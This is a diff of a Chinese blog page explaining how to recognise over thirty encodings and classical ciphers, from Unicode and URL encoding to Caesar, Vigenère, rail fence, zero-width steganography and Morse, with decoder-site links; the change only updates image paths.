-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\AES.png" alt="img"></p>
+<p><img src="/images/AES.png" alt="img"></p>
 <h1 id="Unicode、HTML实体编码、16进制Unicode"><a href="#Unicode、HTML实体编码、16进制Unicode" class="headerlink" title="Unicode、HTML实体编码、16进制Unicode"></a>Unicode、HTML实体编码、16进制Unicode</h1><h2 id="1、Unicode——汉字示例这、字母示例t、数字符号示例5"><a href="#1、Unicode——汉字示例这、字母示例t、数字符号示例5" class="headerlink" title="1、Unicode——汉字示例这、字母示例t、数字符号示例5"></a>1、Unicode——汉字示例<code>这</code>、字母示例<code>t</code>、数字符号示例<code>5</code></h2><p><strong>可以说Unicode与HTML实体编码是一个东西</strong></p>
 <p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\unicode.png" alt="img"></p>
+<p><img src="/images/unicode.png" alt="img"></p>
 <h2 id="2、HTML实体编码——示例与Unicode相同"><a href="#2、HTML实体编码——示例与Unicode相同" class="headerlink" title="2、HTML实体编码——示例与Unicode相同"></a>2、HTML实体编码——示例与Unicode相同</h2><p>字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。</p>
 <p>这么做的目的主要有两个： １、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体： 小于号这样写：&lt; 或 &lt; 大于号这样写：&gt; 或 &gt; 前面的写法称为实体名称，后面的写法则是实体编号。<a href="https://www.qqxiuzi.cn/wz/zixun/1681.htm">ISO-8859-1字符集</a>（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。 ２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\HTML.png" alt="img"></p>
-<h2 id="2、16进制Unicode——示例-u8fd9-u662f-u4e00"><a href="#2、16进制Unicode——示例-u8fd9-u662f-u4e00" class="headerlink" title="2、16进制Unicode——示例\u8fd9\u662f\u4e00"></a>2、16进制Unicode——示例<code>\u8fd9\u662f\u4e00</code></h2><p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\unicode16.png" alt="img"></p>
+<p><img src="/images/HTML.png" alt="img"></p>
+<h2 id="2、16进制Unicode——示例-u8fd9-u662f-u4e00"><a href="#2、16进制Unicode——示例-u8fd9-u662f-u4e00" class="headerlink" title="2、16进制Unicode——示例\u8fd9\u662f\u4e00"></a>2、16进制Unicode——示例<code>\u8fd9\u662f\u4e00</code></h2><p><img src="/images/unicode16.png" alt="img"></p>
 <h3 id="常用解密网站：-2"><a href="#常用解密网站：-2" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><ul>
 <li>Unicode：<a href="https://www.sojson.com/unicode.html">www.sojson.com</a></li>
 <li>16进制Unicode：<a href="http://www.msxindl.com/tools/unicode16.asp">www.msxindl.com</a></li>
@@ -1231,28 +1498,28 @@
 <h1 id="Escape编码-加密、Unescape解码-解密、-u编码、-u解码"><a href="#Escape编码-加密、Unescape解码-解密、-u编码、-u解码" class="headerlink" title="Escape编码/加密、Unescape解码/解密、%u编码、%u解码"></a>Escape编码/加密、Unescape解码/解密、%u编码、%u解码</h1><p><strong>特征：以<code>%u</code>开头</strong></p>
 <p><strong>Escape/Unescape加密解码/编码解码</strong>,又叫%u编码，从以往经验看编码字符串出现有”u”，它是unicode编码，那么Escape编码采用是那一种unicode实现形式呢。其实是UTF-16BE模式。这样一来问题非常简单了。 <strong>Escape编码/加密</strong>,就是字符对应UTF-16 16进制表示方式前面加%u。<strong>Unescape解码/解密</strong>，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样！因为目前%字符，常用作URL编码，所以%u这样编码已经逐渐被废弃了！</p>
 <p>基本类型只对汉字进行编码，复杂类型是所有字符均可</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\escape.png" alt="img"></p>
+<p><img src="/images/escape.png" alt="img"></p>
 <h3 id="常用解密网站：-3"><a href="#常用解密网站：-3" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="http://web.chacuo.net/charsetescape/">http://web.chacuo.net/charsetescape/</a></p>
 <h1 id="URL、Hex编码"><a href="#URL、Hex编码" class="headerlink" title="URL、Hex编码"></a>URL、Hex编码</h1><p><strong>这两种加密的密文是一样的，不同的是当你用url编码网站时是不会把http进行编码的，而Hex编码则全部转化了</strong></p>
 <p>encodeURIComponent() 函数 与 encodeURI() 函数的区别 请注意 encodeURIComponent() 函数 与 encodeURI() 函数的区别之处，前者假定它的参数是 URI 的一部分（比如协议、主机名、路径或查询字符串）。因此 encodeURIComponent() 函数将转义用于分隔 URI 各个部分的标点符号。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\urlencode.png" alt="img"></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\urlencode1.png" alt="img"></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\Hex.png" alt="img"></p>
+<p><img src="/images/urlencode.png" alt="img"></p>
+<p><img src="/images/urlencode1.png" alt="img"></p>
+<p><img src="/images/Hex.png" alt="img"></p>
 <h3 id="常用解密网站：-4"><a href="#常用解密网站：-4" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p>Hex编码：<a href="https://www.107000.com/T-Hex">https://www.107000.com/T-Hex</a> URL 编码：<a href="https://www.sojson.com/encodeurl.html">https://www.sojson.com/encodeurl.html</a></p>
 <h1 id="凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型"><a href="#凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型" class="headerlink" title="凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型"></a>凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型</h1><p>这几类密码原理都是移位调换加密，破解难度低</p>
 <h2 id="1、凯撒密码——示例iodj-khoor-zrug-123"><a href="#1、凯撒密码——示例iodj-khoor-zrug-123" class="headerlink" title="1、凯撒密码——示例iodj{khoor_zrug_123}"></a>1、凯撒密码——示例<code>iodj&#123;khoor_zrug_123&#125;</code></h2><p><strong>只对字母进行加密，常用于CTF比赛中</strong></p>
 <p>凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。此为一种位移加密手段，只对26个（大小写）字母进行位移加密，规则相当简单，容易被破解。下面是明文字母表移回3位的对比： 明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W 密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 然后A变成D，B变成E，Z变成C。 字母最多可移动25位（按字母表）。通常为向后移动，如果您想向前移动1位，则相当于向后移动25位，位移选择为25位。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\kais.png" alt="img"></p>
+<p><img src="/images/kais.png" alt="img"></p>
 <h2 id="2、维吉尼亚密码——示例fmcg-iglmq-wptd-123"><a href="#2、维吉尼亚密码——示例fmcg-iglmq-wptd-123" class="headerlink" title="2、维吉尼亚密码——示例fmcg{iglmq_wptd_123}"></a>2、维吉尼亚密码——示例<code>fmcg&#123;iglmq_wptd_123&#125;</code></h2><p><strong>可以说是凯撒密码的加强版，引入了密钥</strong></p>
 <p>维吉尼亚密码，它将凯撒密码的所有26种排列放到一个表中，形成26行26列的加密字母表。此外，维吉尼亚密码必须有一个由字母组成的密钥，至少有一个字母，最多与明文字母有相同数量的字母。 在凯撒密码中，每个字母都会进行一定偏移值转换，例如，当偏移值是3时，则B被转换为E，C转换成F…。在维吉尼亚密码加密中，则是由具有不同偏移的凯撒密码构成的。 要生成密码，需要使用表格方法，此表(如图所示)包含26行字母表，每一行从上一行到左行被一位偏移。加密时使用哪一行字母表是基于密钥的，在加密过程中密钥会不断变化。 例如，假设明文为： BTTACKATDAFG 选择一个关键字并重复它以获得密钥，例如，当关键字是LIMN时，键是： LIMNLIMNLIMN 在明文中的第一个字母B，对应于密钥中的第一个字母L，使用加密字母表中的L行字母进行加密，得到第一个字母的密文M。同样，第二个明文字母是T，它用表中的I行加密，得到第二个密文B。通过类比，我们可以得到： 明文：BTTACKATDAFG 键：LIMNLIMNLIMN 密文：MBFNNSMGOIRT 解密的过程是加密的逆过程。例如，密钥的第一个字母对应的L行字母表，发现密文的第一个字母M位于B列，因此明文的第一个字母是B。密钥的第二个字母对应于I行字母表，而密文的第二个字母B位于该行的T列中，因此明文的第二个字母是T。等等，你可以得到明文。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\zl.png" alt="img"></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\zl1.png" alt="img"></p>
+<p><img src="/images/zl.png" alt="img"></p>
+<p><img src="/images/zl1.png" alt="img"></p>
 <h2 id="3、栅栏密码基础型"><a href="#3、栅栏密码基础型" class="headerlink" title="3、栅栏密码基础型"></a>3、栅栏密码基础型</h2><p><strong>栅栏密码是按一定规则将明文内容互相调换了位置</strong></p>
 <p>栅栏密码(Rail fence Cipher)基础型加密方式，是一种简单的移动字符位置的加密方法，首先把加密的明文分成N个一组，然后把每组的第1、第2、第M个字符连起来，形成无规律的密文字符串。</p>
 <p>例如字符串“123456789abc”，首先将字符串分成3组，如下排列： 1234 5678 9abc 依次取每一组字符，组成加密后密文：“15926a37b48c”。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\zl2.png" alt="img"></p>
+<p><img src="/images/zl2.png" alt="img"></p>
 <h2 id="4、栅栏密码W型"><a href="#4、栅栏密码W型" class="headerlink" title="4、栅栏密码W型"></a>4、栅栏密码W型</h2><p>栅栏密码W型加密算法： 栅栏密码(Rail fence Cipher)，扩展变种W型，采用先把明文类似”W”形状进行排列，然后再按栏目顺序1-N，取每一栏的所有字符值，组成加密后密文。 比如字符串“123456789”，采用栏目数为3的时，明文将采用如下排列： 1—5—9 -2-4-6-8- –3—-7– 取每一栏所有字符串，组成加密后密文：“159246837”。 W型栅栏密码加密方式，比传统型栅栏密码加密方法，算法略有增强，但目前已只能用于学习算法验证。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\zl3.png" alt="img"></p>
+<p><img src="/images/zl3.png" alt="img"></p>
 <h3 id="常用解密网站：-5"><a href="#常用解密网站：-5" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><ul>
 <li>凯撒密码：<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">www.qqxiuzi.cn</a></li>
 <li>维吉尼亚密码：<a href="http://www.metools.info/code/c71.html">www.metools.info</a></li>
@@ -1262,29 +1529,29 @@
 <h3 id="常用解密网站：-6"><a href="#常用解密网站：-6" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><h1 id="文本隐藏加密、零宽隐写"><a href="#文本隐藏加密、零宽隐写" class="headerlink" title="文本隐藏加密、零宽隐写"></a>文本隐藏加密、零宽隐写</h1><h2 id="1、文本隐藏加密"><a href="#1、文本隐藏加密" class="headerlink" title="1、文本隐藏加密"></a>1、文本隐藏加密</h2><p><strong>特征：加密过的密文会比原文的字节数多，当你按删除键的时候会发现某一处要按好多下才能把前面的字删掉</strong></p>
 <p>原理**：它的原理是在密文中加入了不可见字符组成的编码，例如上述看似九个字符的一句话，通过<a href="https://www.qqxiuzi.cn/zh/zishu-zijieshu/">字数查询</a>可知它实际上有87个字符，多出的字符是由<a href="https://www.qqxiuzi.cn/zh/space.html">零宽空格</a>实现的编码，因为零宽空格不占据空间，所以看不出它的存在。</p>
 <p><strong>使用</strong>：在进行文本隐藏加密时，将需要隐藏的文字写在括号中，就像这样“你好（有才华），我好喜欢你（画的画）！”，然后加密即可隐藏括号内的文字。同时可以设定一个密码，这样只有知道密码的人才能解密隐藏的文字。密码可以是数字、字母和下划线，最多九位。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wb1.png" alt="img"></p>
+<p><img src="/images/wb1.png" alt="img"></p>
 <p>这是加密后的字节数</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wb2.png" alt="img"></p>
+<p><img src="/images/wb2.png" alt="img"></p>
 <p>这是本来的字节数</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wb3.png" alt="img"></p>
+<p><img src="/images/wb3.png" alt="img"></p>
 <h2 id="2、零宽隐写"><a href="#2、零宽隐写" class="headerlink" title="2、零宽隐写"></a>2、零宽隐写</h2><p><strong>特征：解密后明文与密文会分开显示，密文一般隐藏在第一个字后面，不信你试试，保证你十下之内删不完</strong></p>
 <p>与上面文本隐藏加密的原理一样，但过程不一样</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wb4.png" alt="img"></p>
+<p><img src="/images/wb4.png" alt="img"></p>
 <p>这里加密过的密文在文本隐藏加密中解不出来</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wb5.png" alt="img"></p>
+<p><img src="/images/wb5.png" alt="img"></p>
 <h3 id="常用解密网站：-7"><a href="#常用解密网站：-7" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p>文本隐藏加密：<a href="https://www.qqxiuzi.cn/bianma/yincangjiami.php">www.qqxiuzi.cn</a> 零宽隐写：<a href="https://yuanfux.github.io/zero-width-web/">yuanfux.github.io</a></p>
 <h1 id="特殊暗号类加密"><a href="#特殊暗号类加密" class="headerlink" title="特殊暗号类加密"></a>特殊暗号类加密</h1><p>这类加密都是特征性比较强的，易辨别</p>
 <h2 id="1、猪圈密码"><a href="#1、猪圈密码" class="headerlink" title="1、猪圈密码"></a>1、猪圈密码</h2><p><strong>特点：只能对字母加解密并且符号无法复制，粘贴后会直接显示明文</strong></p>
 <p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码，曾经是美国内战时盟军使用的密码，目前仅在密码教学、各种竞赛中使用。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\zj.png" alt="img"></p>
+<p><img src="/images/zj.png" alt="img"></p>
 <h3 id="常用解密网站：-8"><a href="#常用解密网站：-8" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="http://www.metools.info/code/c90.html">http://www.metools.info/code/c90.html</a></p>
 <h2 id="2、与佛论禅"><a href="#2、与佛论禅" class="headerlink" title="2、与佛论禅"></a>2、与佛论禅</h2><p><strong>特点：就是你看不懂的佛语</strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\yufo.png" alt="img"></p>
+<p><img src="/images/yufo.png" alt="img"></p>
 <h3 id="常用解密网站：-9"><a href="#常用解密网站：-9" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
 <h2 id="3、百家姓暗号"><a href="#3、百家姓暗号" class="headerlink" title="3、百家姓暗号"></a>3、百家姓暗号</h2><p><strong>特征：不要多说当你看到一串百家姓的时候多半就是这个暗号了</strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\bj1.png" alt="img"></p>
+<p><img src="/images/bj1.png" alt="img"></p>
 <p>当他解密的的时候前面会多一串固定字符</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\bj2.png" alt="img"></p>
+<p><img src="/images/bj2.png" alt="img"></p>
 <h3 id="常用解密网站：-10"><a href="#常用解密网站：-10" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><ul>
 <li><a href="https://www.ahz0.com/bjx.html">https://www.ahz0.com/bjx.html</a></li>
 <li><a href="https://www.w168.net/anhao.html">https://www.w168.net/anhao.html</a></li>
@@ -1292,7 +1559,7 @@
 <li><a href="https://www.ddosi.com/ah.html">https://www.ddosi.com/ah.html</a></li>
 </ul>
 <h2 id="4、卡尔达诺栅格码"><a href="#4、卡尔达诺栅格码" class="headerlink" title="4、卡尔达诺栅格码"></a>4、卡尔达诺栅格码</h2><p><strong>特征：把明文伪装成垃圾邮件，看着这么多内容，其实我只是加密了admin</strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\ker.png" alt="img"></p>
+<p><img src="/images/ker.png" alt="img"></p>
 <h3 id="常用解密网站：-11"><a href="#常用解密网站：-11" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="https://www.spammimic.com/">https://www.spammimic.com/</a></p>
 <h2 id="5、莫尔斯电码"><a href="#5、莫尔斯电码" class="headerlink" title="5、莫尔斯电码"></a>5、莫尔斯电码</h2><p><strong>特征：密文由不规律的<code>.</code>、<code>/</code>、<code>-</code>组成</strong></p>
 <ul>
@@ -1493,73 +1760,42 @@
 <td align="left"></td>
 </tr>
 </tbody></table>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\ms.png" alt="img"></p>
+<p><img src="/images/ms.png" alt="img"></p>
 <h3 id="常用解密网站：-12"><a href="#常用解密网站：-12" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="https://www.atool99.com/morse.php">https://www.atool99.com/morse.php</a></p>
 <h2 id="6、Quoted-Printable"><a href="#6、Quoted-Printable" class="headerlink" title="6、Quoted-Printable"></a>6、Quoted-Printable</h2><p><strong>这种编码常用与邮件处理，只能对汉字进行编码，特征是=加两个大写字母或数字组合</strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\qp.png" alt="img"></p>
+<p><img src="/images/qp.png" alt="img"></p>
 <h3 id="常用解密网站：-13"><a href="#常用解密网站：-13" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><ul>
 <li><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx">http://www.mxcz.net/tools/QuotedPrintable.aspx</a></li>
 </ul>
 <h2 id="7、ROT13"><a href="#7、ROT13" class="headerlink" title="7、ROT13"></a>7、ROT13</h2><p><strong>特征：它与凯撒密码差不多都是字母替换，你看到一句特别奇怪的语句可能就是它编码的</strong></p>
 <p>ROT13（回转13位，Template:lang，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。它是一种在网路论坛用作隐藏八卦（spoiler）、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。 ROT13被描述成「杂志字谜上下颠倒解答的Usenet对等体」（Usenet equivalent of a magazine printing the answer to a quiz upside down.）Template:cite web ROT13也是过去在古罗马开发的凯撒加密的一种变体。</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\rot1.png" alt="img"></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\rot2.png" alt="img"></p>
+<p><img src="/images/rot1.png" alt="img"></p>
+<p><img src="/images/rot2.png" alt="img"></p>
 <h3 id="常用解密网站：-14"><a href="#常用解密网站：-14" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="http://www.mxcz.net/tools/rot13.aspx">http://www.mxcz.net/tools/rot13.aspx</a></p>
 <h2 id="8、文本加密为汉字"><a href="#8、文本加密为汉字" class="headerlink" title="8、文本加密为汉字"></a>8、文本加密为汉字</h2><p><strong>特征：将明文加密成各种繁体字后面带俩等号</strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wbh1.png" alt="img"></p>
+<p><img src="/images/wbh1.png" alt="img"></p>
 <p>它不仅可以加密成汉字，还可以加密成以下几种类型</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wbz.png" alt="img"></p>
+<p><img src="/images/wbz.png" alt="img"></p>
 <p>比如这样：</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wby.png" alt="img"></p>
+<p><img src="/images/wby.png" alt="img"></p>
 <p>这样：</p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\wbs.png" alt="img"></p>
+<p><img src="/images/wbs.png" alt="img"></p>
 <h3 id="常用解密网站：-15"><a href="#常用解密网站：-15" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php">https://www.qqxiuzi.cn/bianma/wenbenjiami.php</a></p>
 <h1 id="js专用加密"><a href="#js专用加密" class="headerlink" title="js专用加密"></a>js专用加密</h1><h2 id="1、颜文字js加密"><a href="#1、颜文字js加密" class="headerlink" title="1、颜文字js加密"></a>1、颜文字js加密</h2><p><strong>特征：一堆颜文字构成的js代码，在F12中可直接解密执行</strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\js.png" alt="img"></p>
+<p><img src="/images/js.png" alt="img"></p>
